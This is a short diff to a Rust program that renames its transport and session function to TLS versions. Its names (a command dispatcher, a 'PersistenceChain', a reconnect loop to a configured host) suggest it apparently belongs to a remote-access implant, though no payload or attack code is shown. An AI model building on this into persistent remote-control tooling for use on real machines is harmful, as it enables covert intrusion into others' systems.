@@ -46,11 +46,11 @@ async fn main() -> anyhow::Result<()> {
     let mut backoff = RECONNECT_BASE;
     loop {
         eprintln!("[*] Connecting to {}:{}...", config.host, config.port);
-        match transport::Transport::connect(&config).await {
+        match transport::TlsTransport::connect(&config).await {
             Ok(mut transport) => {
                 eprintln!("[+] TLS handshake complete");
                 backoff = RECONNECT_BASE;
-                if let Err(e) = run_session(&mut transport, &dispatch, &chain).await {
+                if let Err(e) = run_tls_session(&mut transport, &dispatch, &chain).await {
                     eprintln!("[!] Session ended: {e}");
                 }
             }
@@ -64,8 +64,8 @@ async fn main() -> anyhow::Result<()> {
     }
 }
 
-async fn run_session(
-    transport: &mut transport::Transport,
+async fn run_tls_session(
+    transport: &mut transport::TlsTransport,
     dispatch: &dispatcher::Dispatcher,
     chain: &persistence::PersistenceChain,
 ) -> anyhow::Result<()> {
